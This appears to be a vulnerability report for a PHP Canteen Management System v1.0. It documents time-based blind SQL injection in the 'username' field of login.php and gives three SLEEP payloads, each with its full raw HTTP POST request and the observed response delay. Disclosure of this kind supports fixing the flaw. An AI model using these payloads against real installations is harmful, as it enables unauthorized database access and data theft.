# Canteen Management System v1.0 by mayuri_k has SQL injection

BUG_Author: Dingzhi.Huang

vendors:https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

Vulnerability File: /youthappam/youthappam/login.php/

Parameter "username" (POST), exists delayed injection vulnerability

Payload1: username=12' AND (SELECT 9725 FROM (SELECT(SLEEP(5)))abcd) AND 'qwer'='qwer&password=34&login=

```
POST /youthappam/youthappam/login.php HTTP/1.1
Host: localhost
Content-Length: 120
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/youthappam/youthappam/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: ci_session=e2rd852shtb8ln3qruscom3ubh61e7hs; PHPSESSID=op50rtk7p4u3f4hmp9vpfv7eta
Connection: close

username=12%27+AND+%28SELECT+9725+FROM+%28SELECT%28SLEEP%285%29%29%29abcd%29+AND+%27qwer%27%3D%27qwer&password=34&login=
```

SELECT(SLEEP(5)), The server response time is 5 seconds

![image](https://github.com/dynamohuang/pic/blob/main/5sec.png)

Payload2: username=12' AND (SELECT 9725 FROM (SELECT(SLEEP(10)))abcd) AND 'qwer'='qwer&password=34&login=

```
POST /youthappam/youthappam/login.php HTTP/1.1
Host: localhost
Content-Length: 121
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/youthappam/youthappam/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: ci_session=e2rd852shtb8ln3qruscom3ubh61e7hs; PHPSESSID=op50rtk7p4u3f4hmp9vpfv7eta
Connection: close

username=12%27+AND+%28SELECT+9725+FROM+%28SELECT%28SLEEP%2810%29%29%29abcd%29+AND+%27qwer%27%3D%27qwer&password=34&login=
```

SELECT(SLEEP(10)), The server response time is 10 seconds


![image](https://github.com/dynamohuang/pic/blob/main/10sec.png)

Payload3: username=12' AND (SELECT 9725 FROM (SELECT(SLEEP(15)))abcd) AND 'qwer'='qwer&password=34&login=

```
POST /youthappam/youthappam/login.php HTTP/1.1
Host: localhost
Content-Length: 121
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/youthappam/youthappam/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: ci_session=e2rd852shtb8ln3qruscom3ubh61e7hs; PHPSESSID=op50rtk7p4u3f4hmp9vpfv7eta
Connection: close

login=&password=34&username=12%27+AND+%28SELECT+9725+FROM+%28SELECT%28SLEEP%2815%29%29%29abcd%29+AND+%27qwer%27%3D%27qwer
```

SELECT(SLEEP(15)), The server response time is 15 seconds

![image](https://github.com/dynamohuang/pic/blob/main/15sec.png)
